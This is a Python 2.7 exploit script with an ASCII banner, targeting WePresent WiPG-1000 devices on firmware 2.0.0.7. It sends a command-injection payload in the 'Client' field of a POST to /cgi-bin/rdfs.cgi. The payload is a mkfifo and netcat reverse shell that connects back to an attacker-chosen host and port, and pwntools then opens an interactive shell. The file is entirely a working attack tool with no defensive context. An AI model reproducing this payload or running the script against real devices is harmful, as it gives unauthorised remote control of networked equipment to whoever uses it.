#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
import requests
from pwn import *
import sys
import threading
import argparse
parser = argparse.ArgumentParser()
parser.add_argument("--target", "-t", dest="target", required=True)
parser.add_argument("--lhost", dest="lhost", required=True)
parser.add_argument("--lport", dest="lport", required=True, type=int)
args = parser.parse_args()
def banner():
 print """
                                              _
                                             | |
 __      _____ _ __  _ __ ___  ___  ___ _ __ | |_
 \ \ /\ / / _ \ '_ \| '__/ _ \/ __|/ _ \ '_ \| __|
  \ V  V /  __/ |_) | | |  __/\__ \  __/ | | | |_
   \_/\_/ \___| .__/|_|  \___||___/\___|_| |_|\__|
  / _|    (_) | |
 | |_ __ _ _| |_|_     Exploit for WePresent
 |  _/ _` | | / __|       WiPG-1000 devices
 | || (_| | | \__ \\     firmware v. 2.0.0.7
 |_| \__,_|_|_|___/
 """
def handler(TARGET, LHOST, LPORT):
 banner()
 cmd = "Client=%3bmkfifo%20/tmp/yqbwq%3b%20nc%20"+LHOST+"%20"+str(LPORT)+"%200%3c/tmp/yqbwq%20%7c%20/bin/sh%20%3e/tmp/yqbwq%202%3e%261%3b%20rm%20/tmp/yqbwq%20%3b&Download=Download"
 exploit = threading.Thread(target=request_shell, args=(TARGET, cmd))
 exploit.daemon = True
 exploit.start()
 try:
  l = listen(int(LPORT))
  l.wait_for_connection()
  l.interactive(pwnlib.term.init())
 except Exception as e:
  log.warning(e)
 except EOFERROR:
  sys.exit()
def request_shell(TARGET, CMD):
 log.info("Exploiting target...")
 cmd = CMD
 headers = {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1', 'Content-Type': 'application/x-www-form-urlencoded'}
 req = requests.post(TARGET + "/cgi-bin/rdfs.cgi", data=cmd, headers=headers) 
handler(args.target, args.lhost, args.lport)

